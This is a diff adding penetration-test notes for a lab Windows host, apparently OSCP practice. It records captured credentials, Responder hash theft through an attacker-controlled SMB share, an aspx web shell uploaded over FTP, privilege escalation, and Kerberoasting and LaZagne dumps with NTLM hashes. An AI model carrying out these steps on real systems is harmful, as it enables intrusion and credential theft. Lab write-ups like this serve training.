@@ -1,0 +1,86 @@
+### ++ Approach 192.168.222.147 ++
+#### Credentials
+	* web_svc:Diamond1 (ftp)
+	* support:Freedom1 (cracked in post-exploitation)
+	* Mary.Williams:9a3121977ee93af56ebd0ef4f527a35e (post-exploitation)
+	* sql_svc:Dolphin1 (Kerberoasting in post-exploitation)
+
+#### Services
+	##### 21 FTP
+		No anonymous session
+		With web_svc we can access and put a aspx shell to trigger it through port 8000 webapp
+
+	##### 22 SSH
+		-
+
+	##### 139,445 SMB
+		No null session
+
+	##### 5040 Unknown ?
+		-
+
+	##### 5985,47001 WinRM
+		-
+
+	##### 8000 Http
+		http-open-proxy: Proxy might be redirecting requests
+		Trigger the shell uploaded through FTP service with web_svc credentials
+
+	##### 8080 Http
+		http-open-proxy: Proxy might be redirecting requests
+		We get a non valid hostname error, so adding 'MS01.oscp.exam' and 'oscp.exam' to /etc/hosts gave us the access to http://ms01.oscp.exam:8080/
+		With responder we setup a share: sudo responder -I tun0
+			Point the share in the webbap: \\192.168.45.204\share\test
+			We will receive a hash for OSCP\web_svc user, after cracking we got web_svc:Diamond1 credentials
+
+	##### 8443 Https
+		https://ms01.oscp.exam:8443/
+
+	##### 135,49664-71 RPC
+		No null session
+
+### ++ Vulnerabilities ++
+
+#### Vuln 1: ++
+	* 
+
+### ++ System Interaction ++
+#### Foothold  
+	* Add 'MS01.oscp.exam' and 'oscp.exam' to /etc/hosts
+	* Setup responder: sudo responder -I tun0
+	* Point the share in the webbap: \\192.168.45.204\share\test and crack the hash
+	* Access ftp and put a aspx shell in wwwroot folder
+	* Trigger the shell in port 8000 webapp
+
+#### Privilege Escalation 
+	* Abuse SeImpersonatePrivilege
+	
+#### Post-exploitation 
+	* With nt authority\system use SharpHound to get a vision of all AD
+	* Kerberoasting: With Rubeus we get sql_svc user
+	* LaZagne:
+		------------------- Hashdump passwords -----------------
+
+		Administrator:500:aad3b435b51404eeaad3b435b51404ee:3c4495bbd678fac8c9d218be4f2bbc7b:::
+		Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+		DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+		WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:11ba4cb6993d434d8dbba9ba45fd9011:::
+		Mary.Williams:1002:aad3b435b51404eeaad3b435b51404ee:9a3121977ee93af56ebd0ef4f527a35e:::
+		support:1003:aad3b435b51404eeaad3b435b51404ee:d9358122015c5b159574a88b3c0d2071:::
+
+		------------------- Pypykatz passwords -----------------
+
+		[+] Shahash found !!!
+		Shahash: 90afa30798b082c0d0aae85435421502c254d459
+		Nthash: 3c4495bbd678fac8c9d218be4f2bbc7b
+		Login: Administrator
+
+		[+] Shahash found !!!
+		Shahash: 453bd3b74324100b8f49f56f6a88a47f244f36a0
+		Nthash: 3858df04a21fb64e6c3ee59faf4c0c89
+		Login: MS01$
+
+		[+] Shahash found !!!
+		Shahash: e7f3a3cf293b58a124e1c636a07dae46ff9946ae
+		Nthash: 53e938166782a44e241beaf02d081ff6
+		Login: web_svc
